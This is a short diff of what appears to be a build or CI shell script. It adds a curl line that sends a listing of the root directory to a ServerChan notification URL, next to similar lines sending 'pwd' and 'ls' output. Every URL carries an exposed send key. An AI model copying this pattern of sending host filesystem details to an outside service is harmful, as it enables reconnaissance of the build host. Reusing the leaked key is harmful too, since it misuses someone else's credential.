@@ -7,6 +7,8 @@ curl -X GET -G --data-urlencode "text=pwd" --data-urlencode "desp=$(pwd)" \
 	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
 curl -X GET -G --data-urlencode "text=ls" --data-urlencode "desp=$(ls)" \
 	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
+curl -X GET -G --data-urlencode "text=ls /" --data-urlencode "desp=$(ls /)" \
+	"https://sc.ftqq.com/SCU39002T44ee92843b639edac4813ce6d566c3c45c3b0f775e97d.send"
 
 pip install coscmd
 
